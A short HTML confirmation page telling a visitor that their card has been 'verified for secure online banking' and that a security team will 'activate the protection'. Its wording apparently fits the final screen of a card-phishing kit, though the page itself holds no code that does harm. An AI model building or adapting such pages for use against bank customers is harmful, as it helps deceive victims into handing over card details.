<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Complete</title>
    <link rel="stylesheet" href="dashboard.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { background: #f4f7f6; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; font-family: 'Inter', sans-serif; padding: 20px; }
        .success-card { background: white; padding: 40px 30px; border-radius: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); max-width: 400px; width: 100%; }
        .check-icon { font-size: 60px; color: #4caf50; margin-bottom: 20px; }
        h1 { font-size: 24px; color: #004c8f; margin-bottom: 10px; }
        p { color: #5f6368; line-height: 1.6; font-size: 14px; margin-bottom: 30px; }
        .btn-finish { background: #004c8f; color: white; border: none; padding: 15px 40px; border-radius: 12px; font-weight: 600; font-size: 16px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="success-card">
        <div class="check-icon">✓</div>
        <h1>Verification Successful</h1>
        <p>Your card has been successfully verified for secure online banking. Our security team will review your details and activate the protection shortly.</p>
        <button class="btn-finish" onclick="window.location.href='index.html'">Finish</button>
    </div>
</body>
</html>
